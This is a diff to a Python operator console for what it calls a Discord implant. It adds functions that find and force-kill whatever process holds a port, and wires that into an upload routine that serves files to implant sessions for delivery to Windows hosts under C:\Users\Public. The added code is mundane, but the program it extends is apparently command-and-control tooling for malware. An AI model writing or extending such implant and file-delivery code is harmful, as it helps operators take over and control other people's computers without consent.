@@ -19,6 +19,10 @@ import urllib.request
 import urllib.error
 import threading
 
+import socket
+import subprocess
+import signal
+
 ROOT = os.path.dirname(os.path.abspath(__file__))
 IMPLANT_SRC = os.path.join(ROOT, "agent", "discord_implant.py")
 SCREENSHOTS_DIR = os.path.join(ROOT, "screenshots")
@@ -32,6 +36,77 @@ DIM = "\033[90m"
 WHT = "\033[97m"
 RST = "\033[0m"
 BOLD = "\033[1m"
+
+
+def port_check(port):
+    """Check if port is in use. Returns (in_use: bool, pid: int or None, name: str or None)."""
+    try:
+        result = subprocess.run(
+            ["netstat", "-ano"], capture_output=True, text=True, timeout=5
+        )
+        for line in result.stdout.splitlines():
+            parts = line.split()
+            if len(parts) >= 5 and f":{port}" in parts[1] and parts[3] == "LISTENING":
+                pid = int(parts[4])
+                try:
+                    tasklist = subprocess.run(
+                        ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
+                        capture_output=True, text=True, timeout=5
+                    )
+                    name = tasklist.stdout.strip().split(",")[0].strip('"')
+                except Exception:
+                    name = "unknown"
+                return True, pid, name
+    except Exception:
+        pass
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.bind(("0.0.0.0", port))
+        s.close()
+        return False, None, None
+    except OSError:
+        return True, None, None
+
+
+def port_force(port, silent=False):
+    """Kill whatever's on the port. Returns True if port is now free."""
+    in_use, pid, name = port_check(port)
+    if not in_use:
+        return True
+    if not silent:
+        print(f"  {YLW}  [*] Port {port} blocked by {name} (PID {pid}){RST}")
+    if pid:
+        try:
+            subprocess.run(["taskkill", "/F", "/PID", str(pid)],
+                           capture_output=True, timeout=5)
+            time.sleep(0.5)
+            if not silent:
+                print(f"  {GRN}  [+] Killed PID {pid}{RST}")
+            return True
+        except Exception:
+            pass
+    return False
+
+
+def port_ensure(port, auto_kill=False):
+    """Ensure port is free. Returns True if ready, False if user declined."""
+    in_use, pid, name = port_check(port)
+    if not in_use:
+        return True
+    print(f"\n  {RED}  [!] Port {port} is BLOCKED by {name} (PID {pid}){RST}")
+    if auto_kill:
+        return port_force(port)
+    print(f"  {YLW}  [K]{RST} Kill PID {pid} and continue")
+    print(f"  {YLW}  [S]{RST} Skip this step")
+    print(f"  {YLW}  [Q]{RST} Quit")
+    choice = input(f"  {CYN}  > {RST}").strip().lower()
+    if choice == "k":
+        return port_force(port)
+    elif choice == "s":
+        return False
+    else:
+        return False
 
 
 def _parse_implant_config():
@@ -374,7 +449,6 @@ def op_upload(session_id=None, local_path=None, remote_path=None):
         default = f"C:\\Users\\Public\\{os.path.basename(local_path)}"
         remote_path = input(f"  {CYN}  Remote path [{WHT}{default}{CYN}]: {RST}").strip() or default
 
-    import socket
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -386,6 +460,8 @@ def op_upload(session_id=None, local_path=None, remote_path=None):
     serve_dir = os.path.dirname(os.path.abspath(local_path))
     filename = os.path.basename(local_path)
     port = 8890
+
+    port_ensure(port, auto_kill=True)
 
     import http.server
     import functools
